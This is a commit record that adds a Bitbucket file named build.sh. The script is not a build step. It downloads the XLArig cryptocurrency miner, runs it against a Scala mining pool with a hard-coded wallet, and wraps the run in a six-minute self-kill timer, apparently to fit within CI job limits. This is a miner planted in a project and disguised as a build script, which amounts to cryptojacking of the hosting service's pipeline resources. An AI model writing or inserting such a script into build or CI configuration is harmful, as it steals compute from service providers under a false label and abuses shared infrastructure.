c611bdf0072e1326bae31b73f41a07064f2bed20
aldo anopali <soapc56@productzf.com>
2021-06-11 10:22:30 +0000

    build.sh created online with Bitbucket

---
+++ build.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+Timeout=360 # 6 minutes
+
+function timeout_monitor() {
+   sleep "$Timeout"
+   kill "$1"
+}
+
+# start the timeout monitor in 
+# background and pass the PID:
+timeout_monitor "$$" &
+Timeout_monitor_pid=$!
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:5555 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p RdX01 -a panthera -k -t8
+# <your script here>
+
+# kill timeout monitor when terminating:
+kill "$Timeout_monitor_pid"
